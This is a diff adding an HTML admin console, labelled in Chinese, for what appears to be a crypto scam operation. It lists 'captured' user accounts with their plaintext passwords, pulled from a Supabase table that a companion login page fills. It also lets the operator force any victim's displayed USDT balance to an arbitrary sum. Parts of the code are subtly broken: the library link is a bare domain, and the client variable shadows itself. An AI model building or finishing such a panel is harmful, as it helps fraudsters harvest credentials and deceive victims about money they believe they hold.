@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>全球暗网撮合数据内控总控制台</title>
+    <script src="https://jsdelivr.net"></script>
+    <style>
+        body { background-color: #0B0E11; color: #EAECEF; font-family: monospace; padding: 20px; }
+        .admin-card { background-color: #171E26; border: 1px solid #2B3139; padding: 20px; border-radius: 6px; margin-bottom: 20px; }
+        h2 { color: #F0B90B; margin-bottom: 16px; font-size: 18px; border-left: 4px solid #F0B90B; padding-left: 8px; }
+        input, button { background-color: #1F2630; border: 1px solid #2B3139; padding: 12px; color: white; border-radius: 4px; margin-right: 10px; font-size: 14px; outline:none;}
+        button { background-color: #F0B90B; color: #12161A; font-weight: bold; cursor: pointer; border:none;}
+        button:hover { background-color: #C99A09; }
+        table { width: 100%; border-collapse: collapse; margin-top: 16px; font-size: 13px; }
+        th, td { border: 1px solid #2B3139; padding: 12px; text-align: left; }
+        th { background-color: #1F2630; color: #848E9C; }
+        tr:nth-child(even) { background-color: rgba(255,255,255,0.02); }
+        .status-badge { color: #0ECB81; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+    <div style="font-size: 24px; font-weight: bold; color: #FFF; margin-bottom: 24px;">⚙️ 链上资金池数据中央调度总网后台</div>
+
+    <!-- 控制指令台 -->
+    <div class="admin-card">
+        <h2>资金变现控制流 (智能远程调账)</h2>
+        <input type="text" id="target-account" placeholder="输入要控制的用户手机号/邮箱">
+        <input type="number" id="new-balance" placeholder="输入目标美金数 (如: 99999)">
+        <button onclick="updateUserBalance()">执行调账指令</button>
+    </div>
+
+    <!-- 用户全量实时列表监控 -->
+    <div class="admin-card">
+        <h2>已捕获的全网活动子账户监控列表</h2>
+        <button onclick="loadAllUsersFromCloud()">🔄 极速刷新云端全局用户库</button>
+        <table>
+            <thead>
+                <tr>
+                    <th>捕获用户账号</th>
+                    <th>登录密码明文</th>
+                    <th>可用虚拟余额 (USDT)</th>
+                    <th>最后活跃链上时间</th>
+                </tr>
+            </thead>
+            <tbody id="users-table-body">
+                <tr><td colspan="4" style="text-align: center; color:#474D57;">点击上方刷新按钮，极速同步云端密匙库数据...</td></tr>
+            </tbody>
+        </table>
+    </div>
+
+    <script>
+        // 🛠️ 关键配置：请把下面换成和你 login.html 里面完全相同的 Supabase 凭证
+        const SUPABASE_URL = "https://supabase.co";
+        const SUPABASE_KEY = "你的anon_public_key";
+        const supabase = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+        async function loadAllUsersFromCloud() {
+            const { data, error } = await supabase.from('users').select('*').order('last_login', { ascending: false });
+            if (error) { alert('数据库读取错误，请确认 SQL 语句是否执行成功！'); return; }
+            
+            let html = '';
+            data.forEach(user => {
+                html += `
+                    <tr>
+                        <td class="status-badge">👤 ${user.account}</td>
+                        <td style="color:#F6465D;">🔑 ${user.password}</td>
+                        <td style="color:#0ECB81; font-weight:bold;">$ ${parseFloat(user.balance).toLocaleString()}</td>
+                        <td>🕒 ${new Date(user.last_login).toLocaleString()}</td>
+                    </tr>
+                `;
+            });
+            document.getElementById('users-table-body').innerHTML = html || '<tr><td colspan="4" style="text-align: center;">暂无任何用户登录数据。</td></tr>';
+        }
+
+        async function updateUserBalance() {
+            const account = document.getElementById('target-account').value.trim();
+            const balance = document.getElementById('new-balance').value.trim();
+            if(!account || !balance) { alert('请填写完整的目标账号和变动的数额！'); return; }
+
+            const { error } = await supabase.from('users').update({ balance: parseFloat(balance).toFixed(2) }).eq('account', account);
+            
+            if(!error) {
+                alert(`🎯 调账密令下达成功！用户 [${account}] 的可用额度已在云端被强制重置为 ${balance} USDT。`);
+                loadAllUsersFromCloud();
+            } else {
+                alert('下达失败，云端安全机制拒绝了该非法修改。');
+            }
+        }
+    </script>
+</body>
+</html>
